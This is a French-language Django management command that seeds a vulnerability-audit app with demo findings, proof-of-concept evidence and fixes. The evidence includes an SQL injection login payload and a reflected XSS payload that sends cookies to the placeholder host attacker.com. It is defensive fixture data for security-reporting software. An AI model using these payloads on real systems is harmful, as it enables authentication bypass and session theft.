from django.core.management.base import BaseCommand
from vulns.models import Vulnerabilite, Preuve, Recommandation, Gravite, StatutVulnerabilite
from audits.models import Audit, TypeAudit, StatutAudit
from projects.models import Projet, Cible


class Command(BaseCommand):
    help = "Peuple la base de données avec des vulnérabilités, preuves PoC et recommandations."

    def handle(self, *args, **options):
        self.stdout.write(self.style.MIGRATE_HEADING("=== Lancement du Seeder de Vulnérabilités ==="))

        audit = Audit.objects.first()
        if not audit:
            projet = Projet.creer(nom="Projet Vuln Demo", organisation="VulnCorp")
            cible = Cible.objects.create(projet=projet, valeur="https://app.vulncorp.io", type="URL")
            audit = Audit.objects.create(projet=projet, cible=cible, type=TypeAudit.STANDARD, statut=StatutAudit.EN_COURS)
            audit.demarrer()

        # 1. SQL Injection (CRITIQUE)
        v1, _ = Vulnerabilite.objects.get_or_create(
            audit=audit,
            titre="Injection SQL sur le paramètre 'username'",
            defaults={
                'description': "Le paramètre 'username' sur /api/users/login/ n'est pas assaini, permettant l'exécution arbitraire de commandes SQL.",
                'gravite': Gravite.CRITIQUE,
                'scoreCVSS': 9.8,
                'codeCWE': 'CWE-89',
                'statut': StatutVulnerabilite.CONFIRMEE,
                'confiance': 100.0
            }
        )
        Preuve.objects.get_or_create(
            vulnerabilite=v1,
            type="PAYLOAD_INJECTION",
            defaults={
                'contenu': "POST /api/users/login/ HTTP/1.1\r\nHost: app.vulncorp.io\r\nContent-Type: application/json\r\n\r\n{\"username\": \"admin' OR '1'='1\", \"password\": \"foo\"}"
            }
        )
        Recommandation.objects.get_or_create(
            vulnerabilite=v1,
            defaults={
                'description': "Utiliser un ORM (Django ORM) ou des requêtes préparées paramétrées pour éliminer toute concaténation SQL.",
                'priorite': Gravite.CRITIQUE,
                'composantConcerne': "Authentification Backend",
                'methodeValidation': "Exécuter un scan d'injection SQL automatisé (sqlmap / OWASP ZAP) pour vérifier l'absence d'erreurs SQL."
            }
        )
        self.stdout.write(f"  [Vulnérabilité] [{v1.gravite}] {v1.titre} ({v1.codeCWE})")

        # 2. XSS Réfléchi (ELEVEE)
        v2, _ = Vulnerabilite.objects.get_or_create(
            audit=audit,
            titre="Cross-Site Scripting (XSS) réfléchi sur la recherche",
            defaults={
                'description': "Le paramètre 'q' sur /search n'échappe pas le contenu HTML injecté dans le DOM de la page.",
                'gravite': Gravite.ELEVEE,
                'scoreCVSS': 7.5,
                'codeCWE': 'CWE-79',
                'statut': StatutVulnerabilite.NOUVELLE,
                'confiance': 95.0
            }
        )
        Preuve.objects.get_or_create(
            vulnerabilite=v2,
            type="HTTP_REQUEST",
            defaults={
                'contenu': "GET /search?q=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script> HTTP/1.1"
            }
        )
        Recommandation.objects.get_or_create(
            vulnerabilite=v2,
            defaults={
                'description': "Appliquer l'échappement HTML contextuel sur le moteur de rendu de template et mettre en place une politique Content-Security-Policy (CSP).",
                'priorite': Gravite.ELEVEE,
                'composantConcerne': "Front-end & Templates",
                'methodeValidation': "Inverser l'injection dans un environnement de test et vérifier l'encodage des caractères < et >."
            }
        )
        self.stdout.write(f"  [Vulnérabilité] [{v2.gravite}] {v2.titre} ({v2.codeCWE})")

        # 3. SSL/TLS Faible (MOYENNE)
        v3, _ = Vulnerabilite.objects.get_or_create(
            audit=audit,
            titre="Support des suites de chiffrement désuètes TLS 1.0",
            defaults={
                'description': "Le serveur web accepte les connexions chiffrées basées sur TLS 1.0 et 1.1 sujettes aux attaques POODLE et BEAST.",
                'gravite': Gravite.MOYENNE,
                'scoreCVSS': 5.3,
                'codeCWE': 'CWE-326',
                'statut': StatutVulnerabilite.CORRIGEE,
                'confiance': 100.0
            }
        )
        Recommandation.objects.get_or_create(
            vulnerabilite=v3,
            defaults={
                'description': "Configurer la directive ssl_protocols sur Nginx pour n'autoriser que TLSv1.2 et TLSv1.3.",
                'priorite': Gravite.MOYENNE,
                'composantConcerne': "Serveur Nginx Reverse Proxy",
                'methodeValidation': "Lancer sslyze ou testssl.sh et vérifier que TLS 1.0 est refusé."
            }
        )
        self.stdout.write(f"  [Vulnérabilité] [{v3.gravite}] {v3.titre} ({v3.codeCWE})")

        # Re-calculer le score de l'audit
        audit.calculerScore()
        audit.save(update_fields=['scoreSecurite'])

        self.stdout.write(self.style.SUCCESS("\n[SUCCESS] Seeder Vulnérabilités terminé avec succès !"))
